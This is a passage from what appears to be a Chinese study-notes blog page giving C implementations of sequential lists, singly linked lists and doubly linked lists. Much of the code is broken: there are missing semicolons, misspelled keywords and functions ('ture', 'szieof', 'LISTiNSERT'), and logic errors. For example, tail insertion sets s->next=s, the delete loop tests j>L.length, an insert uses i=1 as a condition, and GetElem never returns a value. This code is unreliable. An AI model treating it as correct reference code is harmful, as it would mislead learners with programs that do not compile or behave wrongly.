class="hljs-type">int</span> data[MaxSize];   <span class="hljs-comment">//用静态的“数组”存放数据元素</span><br>    <span class="hljs-type">int</span> length;          <span class="hljs-comment">//顺序表的当前长度</span><br>&#125;SqList;                 <span class="hljs-comment">//顺序表的类型定义</span><br><br><span class="hljs-comment">//初始化顺序表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitList</span><span class="hljs-params">(SqList &amp;L)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;MaxSize;i++)<br>    &#123;<br>        L.data[i]=<span class="hljs-number">0</span>;             <span class="hljs-comment">//数据元素初始值默认为0</span><br>    &#125;<br>    L.length=<span class="hljs-number">0</span>;                 <span class="hljs-comment">//顺序表初始化长度为0</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    SqList L;               <span class="hljs-comment">//声明一个顺序表</span><br>    InitList(L);            <span class="hljs-comment">//初始化顺序表</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>动态分配</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> InitSize 10  <span class="hljs-comment">//定义顺序表的初始长度</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">int</span> *data;   <span class="hljs-comment">//动态分配数组的指针</span><br>    <span class="hljs-type">int</span> MaxSize        <span class="hljs-comment">//顺序表的最大容量</span><br>    <span class="hljs-type">int</span> length;          <span class="hljs-comment">//顺序表的当前长度</span><br>&#125;SeqList;                 <span class="hljs-comment">//顺序表的类型定义</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitList</span><span class="hljs-params">(SeqList &amp;L)</span>&#123;<br>    <span class="hljs-comment">//使用malloc函数申请一片连续的空间</span><br>    L.data = (<span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(InitSize*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    L.length = <span class="hljs-number">0</span>;<br>    L.MaxSize = InitSize<br>&#125;<br><br><span class="hljs-comment">//增加动态数组的长度</span><br><span class="hljs-type">void</span> IncreaseSize(SeqList &amp;L,<span class="hljs-type">int</span> len)&#123;<br>    <span class="hljs-type">int</span> *p = L.data;<br>    L.data = (<span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>((L.MaxSize+len)*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;L.length;i++)&#123;<br>        L.data[i]=p[i];            <span class="hljs-comment">//迁移数据</span><br>    &#125;<br>    L.MaxSize = L.MaxSize+len;     <span class="hljs-comment">//数据最大长度增长len</span><br>    <span class="hljs-built_in">free</span>(p);                      <span class="hljs-comment">//释放原来的内存空间</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    SeqList L;<br>    InitList(L);<br>    IncreaseSize(L,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="6-三种基本操作的实现"><a href="#6-三种基本操作的实现" class="headerlink" title="6.三种基本操作的实现"></a>6.三种基本操作的实现</h4><ul><li><h6 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 10  <span class="hljs-comment">//定义最大长度</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">int</span> data[MaxSize];   <span class="hljs-comment">//用静态的“数组”存放数据元素</span><br>    <span class="hljs-type">int</span> length;          <span class="hljs-comment">//顺序表的当前长度</span><br>&#125;SqList;                 <span class="hljs-comment">//顺序表的类型定义</span><br><br><span class="hljs-comment">//初始化顺序表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitList</span><span class="hljs-params">(SqList &amp;L)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;MaxSize;i++)<br>    &#123;<br>        L.data[i]=<span class="hljs-number">0</span>;             <span class="hljs-comment">//数据元素初始值默认为0</span><br>    &#125;<br>    L.length=<span class="hljs-number">0</span>;                 <span class="hljs-comment">//顺序表初始化长度为0</span><br>&#125;<br><br><span class="hljs-comment">//插入顺序表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ListInsert</span><span class="hljs-params">(SqList &amp;L,<span class="hljs-type">int</span> i,<span class="hljs-type">int</span> e)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=L.length;j&gt;=i;j--)<br>    &#123;<br>        L.data[j]=L.data[j<span class="hljs-number">-1</span>];<br>    &#125;<br>    L.data[i<span class="hljs-number">-1</span>]=e;<br>    L.length++;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    SqList L;               <span class="hljs-comment">//声明一个顺序表</span><br>    InitList(L);            <span class="hljs-comment">//初始化顺序表</span><br>    <br>    LISTiNSERT(L,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>);     <span class="hljs-comment">//插入元素</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 10  <span class="hljs-comment">//定义最大长度</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">int</span> data[MaxSize];   <span class="hljs-comment">//用静态的“数组”存放数据元素</span><br>    <span class="hljs-type">int</span> length;          <span class="hljs-comment">//顺序表的当前长度</span><br>&#125;SqList;                 <span class="hljs-comment">//顺序表的类型定义</span><br><br><span class="hljs-comment">//初始化顺序表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitList</span><span class="hljs-params">(SqList &amp;L)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;MaxSize;i++)<br>    &#123;<br>        L.data[i]=<span class="hljs-number">0</span>;             <span class="hljs-comment">//数据元素初始值默认为0</span><br>    &#125;<br>    L.length=<span class="hljs-number">0</span>;                 <span class="hljs-comment">//顺序表初始化长度为0</span><br>&#125;<br><br><span class="hljs-comment">//删除顺序表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ListDelete</span><span class="hljs-params">(SqList &amp;L,<span class="hljs-type">int</span> i,<span class="hljs-type">int</span> e)</span>&#123;<br>    e=L.data[i<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i;j&gt;L.length;j++)<br>    &#123;<br>        L.data[j<span class="hljs-number">-1</span>]=L.data[j];<br>    &#125;  <br>    L.length--;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    SqList L;               <span class="hljs-comment">//声明一个顺序表</span><br>    InitList(L);            <span class="hljs-comment">//初始化顺序表</span><br>    <br>    ListDelete(L,<span class="hljs-number">3</span>,e);     <span class="hljs-comment">//删除元素</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="按位查找"><a href="#按位查找" class="headerlink" title="按位查找"></a>按位查找</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">GetElem</span><span class="hljs-params">(SeqList L, <span class="hljs-type">int</span> i)</span>&#123;<br>    <span class="hljs-keyword">return</span> L.data[i<span class="hljs-number">-1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">LocateElem</span><span class="hljs-params">(SeqList L,<span class="hljs-type">int</span> e)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;L.length;i++)<br>        <span class="hljs-keyword">if</span>(L.data[i]==e)<br>        &#123;<br>            <span class="hljs-keyword">return</span> i+<span class="hljs-number">1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="7-单链表的定义"><a href="#7-单链表的定义" class="headerlink" title="7.单链表的定义"></a>7.单链表的定义</h4><p>&emsp;&emsp;线性表的链式存储又称单链表，它是指通过一组任意的存储单元来存储线性表中的数据元素。为了建立数据元素之间的线性关系，对每个链表结点，出存放元素自身的信息外，还需要存放一个指针</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%8C/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;单链表作为非随机存取的存储结构，并不能直接找到表中某个特定的结点，查找某个特定的结点时，需要从表头开始遍历，依次查找。通常而言，单链表用头指针来标识一个单链表，比如单链表为L，头指针为NULL时表示一个空表，此外为了方便操作，在单链表第一个结点之前附加了一个结点，称为头结点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span>&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;LNode,*LinkList;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="8-单链表的建立"><a href="#8-单链表的建立" class="headerlink" title="8.单链表的建立"></a>8.单链表的建立</h4><ul><li>尾插法建立单链表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">LinkList <span class="hljs-title function_">List_TailInsert</span><span class="hljs-params">(LinkList &amp;L)</span>&#123;<br>    <span class="hljs-type">int</span> x;<br>    L=(LinkList)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LNode));<br>    LNode *s,*r=L;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>    <span class="hljs-keyword">while</span>(x!=<span class="hljs-number">9999</span>)&#123;<br>        s=(LNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LNode));<br>        s-&gt;data=x;<br>        s-&gt;next=s;<br>        r=s;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;d&quot;</span>,&amp;x);<br>    &#125;<br>    r-&gt;next=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> L；<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>头插法建立单链表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">LinkList <span class="hljs-title function_">List_HeadInsert</span><span class="hljs-params">(LinkList &amp;L)</span>&#123;<br>    LNode *s<br>    <span class="hljs-type">int</span> x;<br>    L=(LinkList)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LNode));<br>    L-&gt;next=<span class="hljs-literal">NULL</span>;<br>    LNode *s,*r=L;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>    <span class="hljs-keyword">while</span>(x!=<span class="hljs-number">9999</span>)&#123;<br>        s=(LNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LNode));<br>        s-&gt;data=x;<br>        s-&gt;next=L-&gt;next;<br>        L-&gt;next=s;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;d&quot;</span>,&amp;x);<br>    &#125;<br>    <span class="hljs-keyword">return</span> L；<br>&#125;           <br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="9-按位序插入"><a href="#9-按位序插入" class="headerlink" title="9.按位序插入"></a>9.按位序插入</h4><ul><li>带头结点</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">ListInsert</span><span class="hljs-params">(LinkList &amp;L,<span class="hljs-type">int</span> i,ElemType e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">0</span>)    <span class="hljs-comment">//判断非法输入</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    LNode *p;     <span class="hljs-comment">//指针p指向当前扫描到的结点</span><br>    <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;     <span class="hljs-comment">//j为p当前指向的结点位置</span><br>    p = L;       <span class="hljs-comment">//L指向头检点，头结点作为第0个结点是不存在数据的</span><br>    <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span> &amp;&amp; j&lt;i<span class="hljs-number">-1</span>)    <span class="hljs-comment">//循环找到第i-1个结点</span><br>    &#123;<br>        p=p-&gt;next;<br>        j++; <br>    &#125;<br>    <span class="hljs-keyword">if</span>(p==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    LNode *s=(LNode *)<span class="hljs-built_in">malloc</span>(szieof(LNode));<br>    s-&gt;data = e;<br>    s-&gt;next=p-&gt;next;<br>    p-&gt;next=s;       <span class="hljs-comment">//将结点s连到p之后</span><br>    <span class="hljs-keyword">return</span> ture;    <span class="hljs-comment">//插入成功</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>不带头结点</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">ListInsert</span><span class="hljs-params">(LinkList &amp;L,<span class="hljs-type">int</span> i,ElemType e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">1</span>)    <span class="hljs-comment">//判断非法输入</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(i=<span class="hljs-number">1</span>)<br>    &#123;<br>        LNode *s = (Lnode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LNode));<br>        s-&gt;data=e;<br>        s-&gt;next=L;<br>        L=s;<br>        <span class="hljs-keyword">return</span> ture<br>    &#125;<br>    LNode *p;     <span class="hljs-comment">//指针p指向当前扫描到的结点</span><br>    <span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;     <span class="hljs-comment">//j为p当前指向的结点位置</span><br>    p = L;       <span class="hljs-comment">//L指向头检点，头结点作为第0个结点是不存在数据的</span><br>    <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span> &amp;&amp; j&lt;i<span class="hljs-number">-1</span>)    <span class="hljs-comment">//循环找到第i-1个结点</span><br>    &#123;<br>        p=p-&gt;next;<br>        j++; <br>    &#125;<br>    <span class="hljs-keyword">if</span>(p==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    LNode *s=(LNode *)<span class="hljs-built_in">malloc</span>(szieof(LNode));<br>    s-&gt;data = e;<br>    s-&gt;next=p-&gt;next;<br>    p-&gt;next=s;       <span class="hljs-comment">//将结点s连到p之后</span><br>    <span class="hljs-keyword">return</span> ture;    <span class="hljs-comment">//插入成功</span><br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="10-指定结点插入"><a href="#10-指定结点插入" class="headerlink" title="10.指定结点插入"></a>10.指定结点插入</h4><ul><li>后插操作</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">InsertNext</span><span class="hljs-params">(LNode *p, ElemType e)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (p==<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    LNode *s = (LNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LNode)) ;<br>    <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">NULL</span>)<br>        RETURN FALSE;<br>    s-&gt;data = e;<br>    s-&gt;next = p-&gt;next;<br>    p-&gt;next = s;<br>    <span class="hljs-keyword">return</span> ture;<br>&#125;    <br></code></pre></td></tr></table></figure><ul><li>前插操作</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">InserstPriorNode</span><span class="hljs-params">(LNdoe *p, LNode *s)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(p==<span class="hljs-literal">NULL</span>||S==<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    s-&gt;next = p-&gt;next;<br>    p-&gt;next = s;<br>    ElemType temp = p-&gt;data;<br>    p-&gt;data = s-&gt;data;<br>    s-&gt;data = temp;<br>    <span class="hljs-keyword">return</span> ture;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="11-指定结点删除"><a href="#11-指定结点删除" class="headerlink" title="11.指定结点删除"></a>11.指定结点删除</h4><ul><li>带头结点</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">DeleteNode</span><span class="hljs-params">(LinkList &amp;p)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(p==<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    LNode *q=p-&gt;next<br>    p-&gt;data=p-&gt;next-&gt;data;<br>    p-&gt;next=q-&gt;next;<br>    <span class="hljs-built_in">free</span>(q);<br>    <span class="hljs-keyword">return</span> ture;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="12-单链表查找"><a href="#12-单链表查找" class="headerlink" title="12.单链表查找"></a>12.单链表查找</h4><ul><li>按位查找</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">LNode *<span class="hljs-title function_">GetElem</span><span class="hljs-params">(LinkList L,<span class="hljs-type">int</span> i)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    LNode *p;<br>    <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>    p=L;<br>    <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span> &amp;&amp; j&lt;i&lt;<span class="hljs-number">1</span>)<br>    &#123;<br>        p=p-&gt;next;<br>        j++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>按值查找</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">LNode *<span class="hljs-title function_">LocateElem</span><span class="hljs-params">(LinkList L,ElemType e)</span><br>&#123;<br>    LNode *p = L-&gt;next;<br>    <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;data!=e)<br>        p = p-&gt;next;<br>    <span class="hljs-keyword">return</span> p;       <span class="hljs-comment">//找到后返回该结点指针，否则返回NULL</span><br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="13-双链表初始化"><a href="#13-双链表初始化" class="headerlink" title="13.双链表初始化"></a>13.双链表初始化</h4><ul><li>带头结点</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNode</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNode</span> *<span class="hljs-title">prior</span>,*<span class="hljs-title">next</span>;</span><br>&#125;DNode,*DLinklist;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">InitDLinkList</span><span class="hljs-params">(DLinklist &amp;L)</span><br>&#123;<br>    L = (DNode *)<span class="hljs-built_in">malloc</span>(szie(DNode));<br>    <span class="hljs-keyword">if</span>(L==<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    L-&gt;prior = <span class="hljs-literal">NULL</span>;<br>    L-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> ture;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="14-双链表插入"><a href="#14-双链表插入" class="headerlink" title="14.双链表插入"></a>14.双链表插入</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">InsertNextDNode</span><span class="hljs-params">(DNode *p,DNode *s)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(p==<span class="hljs-literal">NULL</span> ||s==<span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    s-&gt;next=p-&gt;next;<br>    <span class="hljs-keyword">if</span>(p-&gt;next!=<span class="hljs-literal">NULL</span>)  <span class="hljs-comment">//如果p结点有后继结点</span><br>        p-&gt;next-&gt;prior=s;<br>    s-&gt;prior=p;<br>    p-&gt;next=s;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    <br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="15-双链表删除"><a href="#15-双链表删除" class="headerlink" title="15.双链表删除"></a>15.双链表删除</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 